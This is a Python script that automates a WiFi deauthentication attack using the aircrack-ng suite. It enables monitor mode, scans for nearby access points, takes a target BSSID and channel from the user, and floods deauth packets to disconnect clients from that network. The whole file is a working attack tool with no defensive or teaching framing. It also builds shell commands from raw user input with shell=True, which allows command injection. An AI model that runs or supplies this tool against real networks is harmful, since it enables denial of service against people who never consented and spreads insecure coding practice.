import subprocess
import time

def execute_command(command):
    """Run a system command and display the output."""
    try:
        output = subprocess.check_output(command, shell=True, text=True)
        print(output)
    except subprocess.CalledProcessError as e:
        print(f"[!] Error executing command: {command}\n{e}")

def start_monitor_mode(interface):
    """Enable monitor mode on the specified wireless interface."""
    print(f"[*] Enabling monitor mode on {interface}...")
    execute_command(f"airmon-ng start {interface}")

def list_access_points(interface):
    """Open a separate terminal to show nearby access points."""
    print("[*] Scanning for nearby access points...")
    print("[*] A new terminal window will display the networks. Close it when ready.")
    # Launch airodump-ng in a new terminal for XFCE
    subprocess.Popen(["xfce4-terminal", "--hold", "-e", f"airodump-ng {interface}"])
    input("[*] Press Enter when you're ready to continue...")


def deauth_attack(interface, bssid, channel, num_packets, clients=None):
    """Perform deauth attack on the target BSSID."""
    print(f"[*] Targeting BSSID: {bssid} on channel {channel}")

    # Set the interface to the correct channel
    print(f"[*] Setting interface {interface} to channel {channel}")
    execute_command(f"iwconfig {interface} channel {channel}")

    time.sleep(2)
    print(f"[*] Sending {num_packets} deauth packets...")
    if clients:
        for client in clients:
            execute_command(f"aireplay-ng --deauth {num_packets} -a {bssid} -c {client} {interface}")
    else:
        execute_command(f"aireplay-ng --deauth {num_packets} -a {bssid} {interface}")

def main():
    """Main function to handle the script logic."""
    # Get user input
    interface = input("Enter your wireless interface: ").strip()
    start_monitor_mode(interface)

    # Prepare the monitor interface name
    monitor_interface = f"{interface}mon"

    # List nearby access points
    list_access_points(monitor_interface)

    # User selects target
    bssid = input("Enter the BSSID of the target AP: ").strip()
    channel = input("Enter the channel of the target AP: ").strip()

    # Ask for the number of deauth packets
    num_packets = input("Enter the number of deauth packets to send (default is 10): ").strip()
    num_packets = num_packets if num_packets.isdigit() else "10"

    # Perform the deauth attack
    deauth_attack(monitor_interface, bssid, channel, num_packets)

if __name__ == "__main__":
    main()
